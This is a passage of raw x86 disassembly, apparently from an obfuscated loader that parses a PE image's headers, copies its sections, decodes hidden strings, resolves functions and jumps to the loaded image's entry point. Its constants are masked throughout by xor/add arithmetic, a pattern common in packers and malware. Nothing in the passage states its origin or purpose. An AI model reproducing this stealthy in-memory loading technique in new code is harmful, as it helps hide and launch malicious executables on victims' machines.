  4273dc:	mov    eax,DWORD PTR [ebp-0x4]
  4273df:	xor    eax,esi
  4273e1:	add    eax,edi
  4273e3:	mov    DWORD PTR [ebp-0x30],eax
  4273e6:	mov    eax,DWORD PTR [ebp-0x4]
  4273e9:	mov    ecx,DWORD PTR [ebp+0x8]
  4273ec:	mov    eax,DWORD PTR [ebp+0x8]
  4273ef:	add    eax,DWORD PTR [ecx+0x3c]
  4273f2:	mov    DWORD PTR [ebp+0xc],eax
  4273f5:	mov    eax,DWORD PTR [eax+0x50]
  4273f8:	test   eax,eax
  4273fa:	je     0x427830
  427400:	mov    DWORD PTR [ebp-0x2c],0xf88c85a5
  427407:	mov    eax,DWORD PTR [ebp-0x2c]
  42740a:	xor    eax,esi
  42740c:	add    eax,edi
  42740e:	mov    DWORD PTR [ebp-0x2c],eax
  427411:	mov    eax,DWORD PTR [ebp-0x4]
  427414:	mov    eax,DWORD PTR [ebx+0x190]
  42741a:	mov    ecx,DWORD PTR [eax]
  42741c:	mov    ecx,DWORD PTR [ecx+0x3c]
  42741f:	add    ecx,DWORD PTR [eax]
  427421:	mov    eax,DWORD PTR [ebp-0x4]
  427424:	mov    eax,DWORD PTR [ebx+0x18c]
  42742a:	mov    edx,DWORD PTR [eax]
  42742c:	mov    DWORD PTR [ebp-0x20],ecx
  42742f:	mov    DWORD PTR [ebp+0x20],edx
  427432:	cmp    edx,edx
  427434:	jne    0x427468
  427436:	mov    eax,DWORD PTR [ebx+0x1e0]
  42743c:	lea    edx,[ebp-0x18]
  42743f:	push   edx
  427440:	mov    edx,DWORD PTR [ebp-0xc]
  427443:	xor    edx,esi
  427445:	add    edx,edi
  427447:	push   edx
  427448:	push   DWORD PTR [ecx+0x50]
  42744b:	push   DWORD PTR [ebp+0x20]
  42744e:	call   DWORD PTR [eax+0x1c]
  427451:	mov    eax,DWORD PTR [ebp-0x20]
  427454:	mov    ecx,DWORD PTR [eax+0x54]
  427457:	mov    eax,DWORD PTR [eax+0x50]
  42745a:	sub    eax,ecx
  42745c:	add    ecx,DWORD PTR [ebp+0x20]
  42745f:	push   ecx
  427460:	call   0x427dcb
  427465:	mov    edx,DWORD PTR [ebp+0x20]
  427468:	mov    eax,DWORD PTR [ebx+0x194]
  42746e:	mov    DWORD PTR [eax],edx
  427470:	mov    eax,DWORD PTR [ebp+0xc]
  427473:	push   DWORD PTR [eax+0x54]
  427476:	push   DWORD PTR [ebp+0x8]
  427479:	push   edx
  42747a:	call   0x427cc1
  42747f:	mov    ecx,DWORD PTR [ebp+0x20]
  427482:	mov    eax,DWORD PTR [ecx+0x3c]
  427485:	add    eax,ecx
  427487:	movzx  ecx,WORD PTR [eax+0x14]
  42748b:	lea    ecx,[ecx+eax*1+0x18]
  42748f:	mov    DWORD PTR [ebp+0x18],ecx
  427492:	mov    ecx,DWORD PTR [ebp-0x4]
  427495:	movzx  edx,WORD PTR [eax+0x6]
  427499:	xor    ecx,esi
  42749b:	add    ecx,edi
  42749d:	mov    DWORD PTR [ebp+0xc],eax
  4274a0:	cmp    edx,ecx
  4274a2:	je     0x42754f
  4274a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4274ab:	xor    ecx,esi
  4274ad:	add    ecx,edi
  4274af:	mov    DWORD PTR [ebp-0x8],ecx
  4274b2:	mov    ecx,DWORD PTR [ebp-0x24]
  4274b5:	movzx  edx,WORD PTR [eax+0x6]
  4274b9:	xor    ecx,esi
  4274bb:	sub    edx,ecx
  4274bd:	sub    edx,edi
  4274bf:	cmp    DWORD PTR [ebp-0x8],edx
  4274c2:	ja     0x42754f
  4274c8:	mov    edx,DWORD PTR [ebp+0x18]
  4274cb:	add    edx,0x8
  4274ce:	mov    DWORD PTR [ebp+0x18],edx
  4274d1:	jmp    0x4274d6
  4274d3:	mov    edx,DWORD PTR [ebp+0x18]
  4274d6:	mov    eax,DWORD PTR [eax+0x38]
  4274d9:	lea    ecx,[eax-0x1]
  4274dc:	mov    DWORD PTR [ebp-0x38],eax
  4274df:	mov    eax,DWORD PTR [edx]
  4274e1:	test   eax,ecx
  4274e3:	je     0x4274ec
  4274e5:	not    ecx
  4274e7:	and    eax,ecx
  4274e9:	add    eax,DWORD PTR [ebp-0x38]
  4274ec:	mov    ecx,DWORD PTR [edx+0x4]
  4274ef:	add    ecx,DWORD PTR [ebp+0x20]
  4274f2:	push   ecx
  4274f3:	call   0x427dcb
  4274f8:	mov    edx,DWORD PTR [ebp-0x4]
  4274fb:	mov    eax,DWORD PTR [ebp+0x18]
  4274fe:	mov    ecx,DWORD PTR [eax+0x8]
  427501:	xor    edx,esi
  427503:	add    edx,edi
  427505:	cmp    ecx,edx
  427507:	je     0x427520
  427509:	push   ecx
  42750a:	mov    ecx,DWORD PTR [ebp+0x8]
  42750d:	add    ecx,DWORD PTR [eax+0xc]
  427510:	mov    eax,DWORD PTR [eax+0x4]
  427513:	add    eax,DWORD PTR [ebp+0x20]
  427516:	push   ecx
  427517:	push   eax
  427518:	call   0x427cc1
  42751d:	mov    eax,DWORD PTR [ebp+0x18]
  427520:	mov    ecx,DWORD PTR [ebp-0x24]
  427523:	mov    edx,DWORD PTR [ebp-0x8]
  427526:	add    eax,0x28
  427529:	xor    ecx,esi
  42752b:	lea    ecx,[edx+ecx*1+0x3272f1]
  427532:	mov    edx,DWORD PTR [ebp+0xc]
  427535:	mov    DWORD PTR [ebp+0x18],eax
  427538:	mov    eax,DWORD PTR [ebp-0x24]
  42753b:	movzx  edx,WORD PTR [edx+0x6]
  42753f:	xor    eax,esi
  427541:	sub    edx,eax
  427543:	mov    eax,DWORD PTR [ebp+0xc]
  427546:	sub    edx,edi
  427548:	mov    DWORD PTR [ebp-0x8],ecx
  42754b:	cmp    ecx,edx
  42754d:	jbe    0x4274d3
  42754f:	mov    edx,DWORD PTR [ebx+0x18c]
  427555:	mov    ecx,DWORD PTR [ebp+0x20]
  427558:	cmp    ecx,DWORD PTR [edx]
  42755a:	jne    0x427583
  42755c:	mov    eax,DWORD PTR [ebx+0x1e0]
  427562:	lea    edx,[ebp-0x18]
  427565:	push   edx
  427566:	mov    edx,DWORD PTR [ebp-0x10]
  427569:	xor    edx,esi
  42756b:	add    edx,edi
  42756d:	push   edx
  42756e:	mov    edx,DWORD PTR [ebp-0x20]
  427571:	push   DWORD PTR [edx+0x54]
  427574:	push   ecx
  427575:	call   DWORD PTR [eax+0x1c]
  427578:	test   eax,eax
  42757a:	je     0x427821
  427580:	mov    eax,DWORD PTR [ebp+0xc]
  427583:	mov    ecx,DWORD PTR [ebx+0x1c8]
  427589:	mov    ecx,DWORD PTR [ecx]
  42758b:	xor    ecx,esi
  42758d:	add    ecx,edi
  42758f:	je     0x42774c
  427595:	mov    eax,DWORD PTR [ebp-0x4]
  427598:	xor    eax,esi
  42759a:	add    eax,edi
  42759c:	and    DWORD PTR [ebp+0x8],0x0
  4275a0:	mov    DWORD PTR [ebp-0x14],eax
  4275a3:	mov    eax,0xf89c85d9
  4275a8:	lea    ecx,[eax-0x8]
  4275ab:	mov    DWORD PTR [ebp-0x58],0xf89c85d7
  4275b2:	mov    DWORD PTR [ebp-0x54],0xf89c8529
  4275b9:	mov    DWORD PTR [ebp-0x50],eax
  4275bc:	mov    DWORD PTR [ebp-0x4c],ecx
  4275bf:	mov    DWORD PTR [ebp-0x48],ecx
  4275c2:	mov    DWORD PTR [ebp-0x44],0xf89c85a5
  4275c9:	mov    edx,DWORD PTR [ebp+0x8]
  4275cc:	mov    ecx,0x8aa
  4275d1:	xor    cx,WORD PTR [ebp+edx*4-0x58]
  4275d6:	mov    edx,0x72f1
  4275db:	add    cx,dx
  4275de:	mov    edx,DWORD PTR [ebp+0x8]
  4275e1:	inc    DWORD PTR [ebp+0x8]
  4275e4:	cmp    DWORD PTR [ebp+0x8],0x6
  4275e8:	mov    WORD PTR [ebp+edx*2-0xc0],cx
  4275f0:	jb     0x4275c9
  4275f2:	mov    ecx,0xf89c852b
  4275f7:	mov    DWORD PTR [ebp-0xb0],eax
  4275fd:	mov    DWORD PTR [ebp-0x9c],eax
  427603:	mov    DWORD PTR [ebp-0x74],eax
  427606:	mov    DWORD PTR [ebp-0x70],eax
  427609:	lea    eax,[ecx-0x3]
  42760c:	mov    edx,0xf89c85ff
  427611:	mov    DWORD PTR [ebp-0x64],eax
  427614:	mov    DWORD PTR [ebp-0x60],eax
  427617:	mov    DWORD PTR [ebp-0xb4],0xf89c85f1
  427621:	mov    DWORD PTR [ebp-0xac],ecx
  427627:	mov    DWORD PTR [ebp-0xa8],edx
  42762d:	mov    DWORD PTR [ebp-0xa4],0xf89c85d2
  427637:	mov    DWORD PTR [ebp-0xa0],0xf89c85d7
  427641:	mov    DWORD PTR [ebp-0x98],0xf89c85fe
  42764b:	mov    DWORD PTR [ebp-0x94],0xf89c85d7
  427655:	mov    DWORD PTR [ebp-0x90],0xf89c8529
  42765f:	mov    DWORD PTR [ebp-0x8c],ecx
  427665:	mov    DWORD PTR [ebp-0x88],0xf89c8522
  42766f:	mov    DWORD PTR [ebp-0x84],edx
  427675:	mov    DWORD PTR [ebp-0x80],0xf89c85d4
  42767c:	mov    DWORD PTR [ebp-0x7c],ecx
  42767f:	mov    DWORD PTR [ebp-0x78],0xf89c85fa
  427686:	mov    DWORD PTR [ebp-0x6c],ecx
  427689:	mov    DWORD PTR [ebp-0x68],0xf89c85de
  427690:	mov    DWORD PTR [ebp-0x5c],0xf89c85a5
  427697:	xor    eax,eax
  427699:	mov    cl,BYTE PTR [ebp+eax*4-0xb4]
  4276a0:	xor    cl,0xaa
  4276a3:	sub    cl,0xf
  4276a6:	mov    BYTE PTR [ebp+eax*1-0xd8],cl
  4276ad:	inc    eax
  4276ae:	cmp    eax,0x17
  4276b1:	jb     0x427699
  4276b3:	mov    eax,DWORD PTR [ebx+0x1e0]
  4276b9:	lea    ecx,[ebp-0xc0]
  4276bf:	push   ecx
  4276c0:	call   DWORD PTR [eax+0x4]
  4276c3:	mov    ecx,DWORD PTR [ebx+0x1e0]
  4276c9:	lea    edx,[ebp-0xd8]
  4276cf:	push   edx
  4276d0:	push   eax
  4276d1:	call   DWORD PTR [ecx+0x8]
  4276d4:	mov    DWORD PTR [ebp-0x40],eax
  4276d7:	lea    eax,[ebp-0x14]
  4276da:	push   eax
  4276db:	mov    eax,DWORD PTR [ebx+0x18c]
  4276e1:	push   DWORD PTR [eax]
  4276e3:	mov    eax,DWORD PTR [ebp-0x40]
  4276e6:	call   eax
  4276e8:	mov    eax,DWORD PTR [ebp-0x4]
  4276eb:	xor    eax,esi
  4276ed:	add    eax,edi
  4276ef:	mov    DWORD PTR [ebp-0x34],eax
  4276f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4276f5:	mov    eax,DWORD PTR [ebp-0x14]
  4276f8:	xor    ecx,esi
  4276fa:	add    ecx,edi
  4276fc:	cmp    eax,ecx
  4276fe:	je     0x427749
  427700:	mov    DWORD PTR [ebp-0x3c],eax
  427703:	jmp    0x427714
  427705:	mov    eax,DWORD PTR [eax]
  427707:	mov    ecx,DWORD PTR [ebp-0x3c]
  42770a:	mov    DWORD PTR [ebp-0x14],eax
  42770d:	mov    eax,DWORD PTR [ebp-0x14]
  427710:	cmp    eax,ecx
  427712:	je     0x427721
  427714:	mov    edx,DWORD PTR [eax+0x18]
  427717:	mov    ecx,DWORD PTR [ebx+0x18c]
  42771d:	cmp    edx,DWORD PTR [ecx]
  42771f:	jne    0x427705
  427721:	mov    ecx,DWORD PTR [ebx+0x18c]
  427727:	mov    edx,DWORD PTR [eax+0x18]
  42772a:	cmp    edx,DWORD PTR [ecx]
  42772c:	jne    0x427749
  42772e:	mov    ecx,DWORD PTR [ebx+0x190]
  427734:	mov    edx,DWORD PTR [ebp-0x20]
  427737:	mov    edx,DWORD PTR [edx+0x28]
  42773a:	add    edx,DWORD PTR [ecx]
  42773c:	mov    DWORD PTR [eax+0x1c],edx
  42773f:	mov    eax,DWORD PTR [ebp-0x24]
  427742:	xor    eax,esi
  427744:	add    eax,edi
  427746:	mov    DWORD PTR [ebp-0x34],eax
  427749:	mov    eax,DWORD PTR [ebp+0xc]
  42774c:	push   ebx
  42774d:	push   eax
  42774e:	push   DWORD PTR [ebp+0x20]
  427751:	call   0x426ecf
  427756:	test   eax,eax
  427758:	je     0x427821
  42775e:	push   DWORD PTR [ebp+0xc]
  427761:	mov    ecx,ebx
  427763:	push   DWORD PTR [ebp+0x20]
  427766:	call   0x426e28
  42776b:	test   eax,eax
  42776d:	je     0x427821
  427773:	mov    eax,DWORD PTR [ebp+0xc]
  427776:	mov    edx,DWORD PTR [ebp+0x20]
  427779:	mov    ecx,ebx
  42777b:	call   0x426d01
  427780:	test   eax,eax
  427782:	je     0x427821
  427788:	push   ebx
  427789:	push   DWORD PTR [ebp+0x20]
  42778c:	call   0x4271b2
  427791:	test   eax,eax
  427793:	je     0x427821
  427799:	mov    eax,DWORD PTR [ebx+0x18c]
  42779f:	mov    edx,DWORD PTR [ebp+0x20]
  4277a2:	cmp    edx,DWORD PTR [eax]
  4277a4:	jne    0x4277c0
  4277a6:	mov    eax,DWORD PTR [ebx+0x1e0]
  4277ac:	lea    ecx,[ebp-0x18]
  4277af:	push   ecx
  4277b0:	push   DWORD PTR [ebp-0x18]
  4277b3:	mov    ecx,DWORD PTR [ebp-0x20]
  4277b6:	push   DWORD PTR [ecx+0x54]
  4277b9:	push   edx
  4277ba:	call   DWORD PTR [eax+0x1c]
  4277bd:	mov    edx,DWORD PTR [ebp+0x20]
  4277c0:	mov    eax,DWORD PTR [ebx+0x1c8]
  4277c6:	mov    eax,DWORD PTR [eax]
  4277c8:	xor    eax,esi
  4277ca:	add    eax,edi
  4277cc:	je     0x427805
  4277ce:	mov    ecx,DWORD PTR [ebp+0xc]
  4277d1:	mov    eax,DWORD PTR [ecx+0x28]
  4277d4:	mov    DWORD PTR [ebp+0x8],0xf89ca5a5
  4277db:	mov    esi,DWORD PTR [ebp+0x8]
  4277de:	push   DWORD PTR [ebp+0x14]
  4277e1:	xor    esi,0x8aa
  4277e7:	push   DWORD PTR [ebp+0x10]
  4277ea:	add    esi,0x72f1
  4277f0:	or     WORD PTR [ecx+0x16],si
  4277f4:	add    eax,edx
  4277f6:	push   edx
  4277f7:	call   eax
  4277f9:	mov    DWORD PTR [ebx+0x1d0],0xf89c85ba
  427803:	jmp    0x42780f
  427805:	mov    eax,DWORD PTR [ebp+0xc]
  427808:	mov    eax,DWORD PTR [eax+0x28]
  42780b:	add    eax,edx
  42780d:	call   eax
  42780f:	mov    DWORD PTR [ebp-0x8],eax
  427812:	mov    eax,DWORD PTR [ebp-0x8]
  427815:	mov    ecx,DWORD PTR [ebp+0x1c]
  427818:	mov    DWORD PTR [ecx],eax
  42781a:	mov    DWORD PTR [ebp-0x30],0x1
  427821:	cmp    DWORD PTR [ebp-0x30],0x0
  427825:	jne    0x42782b
  427827:	and    DWORD PTR [ebp+0x20],0x0
  42782b:	mov    eax,DWORD PTR [ebp+0x20]
  42782e:	jmp    0x427832
  427830:	xor    eax,eax
  427832:	pop    edi
  427833:	pop    esi
  427834:	pop    ebx
  427835:	leave  
  427836:	ret    0x1c
  427839:	push   ebp
  42783a:	mov    ebp,esp
  42783c:	movzx  edx,WORD PTR [ecx+0x6]
  427840:	movzx  eax,WORD PTR [ecx+0x14]
  427844:	push   ebx
  427845:	push   edi
  427846:	xor    edi,edi
  427848:	lea    eax,[eax+ecx*1+0x18]
  42784c:	test   edx,edx
  42784e:	je     0x42786f
  427850:	mov    ecx,DWORD PTR [eax+0xc]
  427853:	lea    ebx,[ecx+esi*1]
  427856:	cmp    DWORD PTR [ebp+0x8],ebx
  427859:	jb     0x427867
  42785b:	mov    ebx,DWORD PTR [eax+0x8]
  42785e:	add    ebx,ecx
  427860:	add    ebx,esi
  427862:	cmp    DWORD PTR [ebp+0x8],ebx
  427865:	jb     0x427871
  427867:	add    eax,0x28
  42786a:	inc    edi
  42786b:	cmp    edi,edx
  42786d:	jb     0x427850
  42786f:	xor    eax,eax
  427871:	pop    edi
  427872:	pop    ebx
  427873:	pop    ebp
  427874:	ret    0x4
  427877:	push   ebp
  427878:	mov    ebp,esp
  42787a:	sub    esp,0x34
  42787d:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  427884:	mov    DWORD PTR [ebp-0x18],0xf89c85ba
  42788b:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  427892:	mov    DWORD PTR [ebp-0x8],0xf89c85da
  427899:	mov    DWORD PTR [ebp-0x20],0xf89c85fa
  4278a0:	mov    DWORD PTR [ebp-0x2c],0xf89c8523
  4278a7:	mov    DWORD PTR [ebp-0x2c],0xf89c85c3
  4278ae:	mov    DWORD PTR [ebp-0x10],eax
  4278b1:	mov    eax,DWORD PTR [ebp+0x8]
  4278b4:	mov    DWORD PTR [ebp-0x14],eax
  4278b7:	mov    eax,DWORD PTR [ebp-0xc]
  4278ba:	push   ebx
  4278bb:	mov    ecx,0x75108aa
  4278c0:	xor    eax,ecx
  4278c2:	push   esi
  4278c3:	mov    esi,DWORD PTR [ebp-0x10]
  4278c6:	mov    edx,0x3272f1
  4278cb:	add    eax,edx
  4278cd:	push   edi
  4278ce:	cmp    esi,eax
  4278d0:	je     0x427aaf
  4278d6:	mov    eax,DWORD PTR [ebp-0xc]
  4278d9:	mov    esi,DWORD PTR [ebp-0x14]
  4278dc:	xor    eax,ecx
  4278de:	add    eax,edx
  4278e0:	cmp    esi,eax
  4278e2:	je     0x427aaf
  4278e8:	mov    eax,DWORD PTR [ebp-0xc]
  4278eb:	xor    eax,ecx
  4278ed:	add    eax,edx
  4278ef:	mov    DWORD PTR [ebp-0x24],eax
  4278f2:	mov    eax,DWORD PTR [ebp-0xc]
  4278f5:	xor    eax,ecx
  4278f7:	add    eax,edx
  4278f9:	mov    DWORD PTR [ebp-0x28],eax
  4278fc:	mov    edi,DWORD PTR [ebp-0x20]
  4278ff:	mov    ebx,DWORD PTR [ebp-0x8]
  427902:	mov    esi,0x8aa
  427907:	xor    edi,esi
  427909:	mov    eax,0x72f1
  42790e:	xor    ebx,esi
  427910:	add    edi,eax
  427912:	add    ebx,eax
  427914:	sub    ebx,edi
  427916:	mov    WORD PTR [ebp-0x8],bx
  42791a:	jmp    0x4279df
  42791f:	mov    edi,DWORD PTR [ebp-0xc]
  427922:	mov    bx,WORD PTR [ebp-0x4]
  427926:	xor    edi,esi
  427928:	add    edi,eax
  42792a:	cmp    bx,di
  42792d:	je     0x427a21
  427933:	mov    edi,DWORD PTR [ebp-0xc]
  427936:	mov    ebx,DWORD PTR [ebp+0xc]
  427939:	xor    edi,ecx
  42793b:	add    edi,edx
  42793d:	cmp    ebx,edi
  42793f:	mov    di,WORD PTR [ebp-0x4]
  427943:	mov    bx,WORD PTR [ebp+0x8]
  427947:	je     0x4279b2
  427949:	cmp    bx,di
  42794c:	je     0x4279bb
  42794e:	mov    edi,DWORD PTR [ebp-0x20]
  427951:	mov    bx,WORD PTR [ebp+0x8]
  427955:	xor    edi,esi
  427957:	add    edi,eax
  427959:	cmp    bx,di
  42795c:	jb     0x42797c
  42795e:	mov    edi,DWORD PTR [ebp-0x2c]
  427961:	mov    bx,WORD PTR [ebp+0x8]
  427965:	xor    edi,esi
  427967:	add    edi,eax
  427969:	cmp    bx,di
  42796c:	ja     0x42797c
  42796e:	movzx  edi,WORD PTR [ebp+0x8]
  427972:	movzx  ebx,WORD PTR [ebp-0x8]
  427976:	add    edi,ebx
  427978:	mov    WORD PTR [ebp+0x8],di
  42797c:	mov    edi,DWORD PTR [ebp-0x20]
  42797f:	mov    bx,WORD PTR [ebp-0x4]
  427983:	xor    edi,esi
  427985:	add    edi,eax
  427987:	cmp    bx,di
  42798a:	jb     0x4279aa
  42798c:	mov    edi,DWORD PTR [ebp-0x2c]
  42798f:	mov    bx,WORD PTR [ebp-0x4]
  427993:	xor    edi,esi
  427995:	add    edi,eax
  427997:	cmp    bx,di
  42799a:	ja     0x4279aa
  42799c:	movzx  edi,WORD PTR [ebp-0x4]
  4279a0:	movzx  ebx,WORD PTR [ebp-0x8]
  4279a4:	add    edi,ebx
  4279a6:	mov    WORD PTR [ebp-0x4],di
  4279aa:	mov    di,WORD PTR [ebp-0x4]
  4279ae:	mov    bx,WORD PTR [ebp+0x8]
  4279b2:	cmp    bx,di
  4279b5:	jne    0x427aaf
  4279bb:	mov    edi,DWORD PTR [ebp-0x1c]
  4279be:	mov    ebx,DWORD PTR [ebp-0x10]
  4279c1:	xor    edi,ecx
  4279c3:	lea    edi,[edi+ebx*1+0x3272f1]
  4279ca:	mov    DWORD PTR [ebp-0x10],edi
  4279cd:	mov    edi,DWORD PTR [ebp-0x1c]
  4279d0:	mov    ebx,DWORD PTR [ebp-0x14]
  4279d3:	xor    edi,ecx
  4279d5:	lea    edi,[edi+ebx*1+0x3272f1]
  4279dc:	mov    DWORD PTR [ebp-0x14],edi
  4279df:	mov    edi,DWORD PTR [ebp-0x24]
  4279e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4279e5:	mov    di,WORD PTR [ebx+edi*2]
  4279e9:	mov    WORD PTR [ebp+0x8],di
  4279ed:	mov    edi,DWORD PTR [ebp-0x28]
  4279f0:	mov    ebx,DWORD PTR [ebp-0x14]
  4279f3:	mov    di,WORD PTR [ebx+edi*2]
  4279f7:	mov    WORD PTR [ebp-0x4],di
  4279fb:	mov    edi,DWORD PTR [ebp-0xc]
  4279fe:	mov    bx,WORD PTR [ebp+0x8]
  427a02:	xor    edi,esi
  427a04:	add    edi,eax
  427a06:	cmp    bx,di
  427a09:	jne    0x42791f
  427a0f:	mov    eax,DWORD PTR [ebp-0x18]
  427a12:	mov    esi,DWORD PTR [ebp-0xc]
  427a15:	xor    eax,ecx
  427a17:	add    eax,edx
  427a19:	imul   eax,esi
  427a1c:	mov    DWORD PTR [ebp-0xc],eax
  427a1f:	jmp    0x427a33
  427a21:	mov    eax,DWORD PTR [ebp-0xc]
  427a24:	mov    esi,DWORD PTR [ebp-0x18]
  427a27:	xor    eax,ecx
  427a29:	lea    eax,[eax+esi*1+0x3272f1]
  427a30:	mov    DWORD PTR [ebp-0x18],eax
  427a33:	mov    eax,DWORD PTR [ebp-0x24]
  427a36:	sub    eax,edx
  427a38:	xor    eax,ecx
  427a3a:	mov    DWORD PTR [ebp-0x30],eax
  427a3d:	mov    eax,DWORD PTR [ebp-0x28]
  427a40:	sub    eax,edx
  427a42:	xor    eax,ecx
  427a44:	mov    DWORD PTR [ebp-0x34],eax
  427a47:	mov    eax,DWORD PTR [ebp-0x34]
  427a4a:	mov    esi,DWORD PTR [ebp-0x1c]
  427a4d:	xor    esi,ecx
  427a4f:	add    esi,edx
  427a51:	xor    eax,ecx
  427a53:	add    eax,0x3272f1
  427a58:	imul   esi,eax
  427a5b:	mov    eax,DWORD PTR [ebp-0x14]
  427a5e:	movzx  eax,WORD PTR [esi+eax*1]
  427a62:	mov    esi,DWORD PTR [ebp-0x30]
  427a65:	mov    edi,DWORD PTR [ebp-0x1c]
  427a68:	xor    esi,ecx
  427a6a:	add    esi,edx
  427a6c:	xor    edi,ecx
  427a6e:	add    edi,edx
  427a70:	imul   edi,esi
  427a73:	mov    esi,DWORD PTR [ebp-0x10]
  427a76:	movzx  esi,WORD PTR [edi+esi*1]
  427a7a:	sub    eax,edx
  427a7c:	sub    esi,edx
  427a7e:	xor    eax,ecx
  427a80:	xor    esi,ecx
  427a82:	cmp    esi,eax
  427a84:	jne    0x427aaf
  427a86:	mov    eax,DWORD PTR [ebp-0x30]
  427a89:	mov    esi,DWORD PTR [ebp-0x1c]
  427a8c:	xor    eax,ecx
  427a8e:	add    eax,0x3272f1
  427a93:	xor    esi,ecx
  427a95:	add    esi,edx
  427a97:	imul   esi,eax
  427a9a:	mov    eax,DWORD PTR [ebp-0x10]
  427a9d:	movzx  eax,WORD PTR [esi+eax*1]
  427aa1:	mov    esi,DWORD PTR [ebp-0xc]
  427aa4:	sub    eax,edx
  427aa6:	xor    eax,ecx
  427aa8:	cmp    eax,esi
  427aaa:	mov    eax,DWORD PTR [ebp-0xc]
  427aad:	je     0x427ab2
  427aaf:	mov    eax,DWORD PTR [ebp-0x18]
  427ab2:	pop    edi
  427ab3:	xor    eax,ecx
  427ab5:	pop    esi
  427ab6:	add    eax,edx
  427ab8:	pop    ebx
  427ab9:	leave  
  427aba:	ret    0x8
  427abd:	push   ebp
  427abe:	mov    ebp,esp
  427ac0:	push   ecx
  427ac1:	mov    cx,WORD PTR [eax]
  427ac4:	push   esi
  427ac5:	mov    esi,0x3b5a
  427aca:	sub    cx,si
  427acd:	mov    esi,0x8a98
  427ad2:	xor    cx,si
  427ad5:	mov    esi,0x4e3e
  427ada:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427ae1:	mov    edx,0xf89c85a5
  427ae6:	cmp    cx,si
  427ae9:	je     0x427b48
  427aeb:	push   ebx
  427aec:	push   edi
  427aed:	movzx  ecx,cx
  427af0:	mov    edi,0xffcd8d0f
  427af5:	mov    esi,0x75108aa
  427afa:	mov    ebx,0x4f9a
  427aff:	cmp    cx,bx
  427b02:	jne    0x427b07
  427b04:	mov    DWORD PTR [ebp-0x4],edx
  427b07:	lea    edx,[edi+0x1]
  427b0a:	xor    edx,esi
  427b0c:	mov    edi,edx
  427b0e:	xor    edi,esi
  427b10:	mov    cx,WORD PTR [eax+edi*2+0x64e5e2]
  427b18:	mov    ebx,0x3b5a
  427b1d:	sub    cx,bx
  427b20:	mov    ebx,0x8a98
  427b25:	xor    cx,bx
  427b28:	mov    ebx,0x4e3e
  427b2d:	cmp    cx,bx
  427b30:	jne    0x427afa
  427b32:	mov    ecx,DWORD PTR [ebp-0x4]
  427b35:	pop    edi
  427b36:	pop    ebx
  427b37:	cmp    ecx,0xf89c85a4
  427b3d:	je     0x427b48
  427b3f:	xor    ecx,esi
  427b41:	lea    eax,[eax+ecx*2+0x64e5e4]
  427b48:	pop    esi
  427b49:	leave  
  427b4a:	ret    
  427b4b:	push   ebp
  427b4c:	mov    ebp,esp
  427b4e:	push   ecx
  427b4f:	push   esi
  427b50:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427b57:	mov    esi,0xf89c85a5
  427b5c:	call   0x427abd
  427b61:	mov    cl,BYTE PTR [eax]
  427b63:	dec    cl
  427b65:	xor    cl,0x7c
  427b68:	cmp    cl,0x83
  427b6b:	je     0x427bd0
  427b6d:	push   ebx
  427b6e:	push   edi
  427b6f:	mov    edx,eax
  427b71:	mov    edi,0xffcd8d0f
  427b76:	mov    ecx,0x75108aa
  427b7b:	mov    dx,WORD PTR [edx]
  427b7e:	mov    ebx,0x3b5a
  427b83:	sub    dx,bx
  427b86:	mov    ebx,0x8a98
  427b8b:	xor    dx,bx
  427b8e:	mov    ebx,0x4e4c
  427b93:	cmp    dx,bx
  427b96:	jne    0x427b9b
  427b98:	mov    DWORD PTR [ebp-0x4],esi
  427b9b:	lea    esi,[edi+0x1]
  427b9e:	xor    esi,ecx
  427ba0:	mov    edi,esi
  427ba2:	xor    edi,ecx
  427ba4:	lea    edx,[eax+edi*2+0x64e5e2]
  427bab:	mov    bl,BYTE PTR [edx]
  427bad:	dec    bl
  427baf:	xor    bl,0x7c
  427bb2:	cmp    bl,0x83
  427bb5:	jne    0x427b7b
  427bb7:	mov    edx,DWORD PTR [ebp-0x4]
  427bba:	pop    edi
  427bbb:	pop    ebx
  427bbc:	cmp    edx,0xf89c85a4
  427bc2:	je     0x427bd0
  427bc4:	xor    edx,ecx
  427bc6:	xor    ecx,ecx
  427bc8:	mov    WORD PTR [eax+edx*2+0x64e5e2],cx
  427bd0:	pop    esi
  427bd1:	leave  
  427bd2:	ret    
  427bd3:	push   ebp
  427bd4:	mov    ebp,esp
  427bd6:	push   ecx
  427bd7:	push   esi
  427bd8:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  427bdf:	mov    esi,0xf89c85a5
  427be4:	call   0x427abd
  427be9:	mov    cx,WORD PTR [eax]
  427bec:	mov    edx,0x3b5a
  427bf1:	sub    cx,dx
  427bf4:	mov    edx,0x8a98
  427bf9:	xor    cx,dx
  427bfc:	mov    edx,0x4e3e
  427c01:	cmp    cx,dx
  427c04:	je     0x427c5d
  427c06:	push   ebx
  427c07:	push   edi
  427c08:	movzx  ecx,cx
  427c0b:	mov    edx,0xffcd8d0f
  427c10:	mov    edi,0x75108aa
  427c15:	mov    ebx,0x4e4c
  427c1a:	cmp    cx,bx
  427c1d:	jne    0x427c22
  427c1f:	mov    DWORD PTR [ebp-0x4],esi
  427c22:	lea    esi,[edx+0x1]
  427c25:	xor    esi,edi
  427c27:	mov    edx,esi
  427c29:	xor    edx,edi
  427c2b:	mov    cx,WORD PTR [eax+edx*2+0x64e5e2]
  427c33:	mov    ebx,0x3b5a
  427c38:	sub    cx,bx
  427c3b:	mov    ebx,0x8a98
  427c40:	xor    cx,bx
  427c43:	mov    ebx,0x4e3e
  427c48:	cmp    cx,bx
  427c4b:	jne    0x427c15
  427c4d:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  427c54:	pop    edi
  427c55:	pop    ebx
  427c56:	je     0x427c5d
  427c58:	xor    eax,eax
  427c5a:	inc    eax
  427c5b:	jmp    0x427c5f
  427c5d:	xor    eax,eax
  427c5f:	pop    esi
  427c60:	leave  
  427c61:	ret    
  427c62:	push   ebp
  427c63:	mov    ebp,esp
  427c65:	push   ecx
  427c66:	mov    eax,DWORD PTR [ebp+0x8]
  427c69:	movzx  ecx,WORD PTR [eax]
  427c6c:	push   esi
  427c6d:	lea    eax,[ecx-0x3b5a]
  427c73:	mov    esi,0x8a98
  427c78:	push   edi
  427c79:	xor    eax,esi
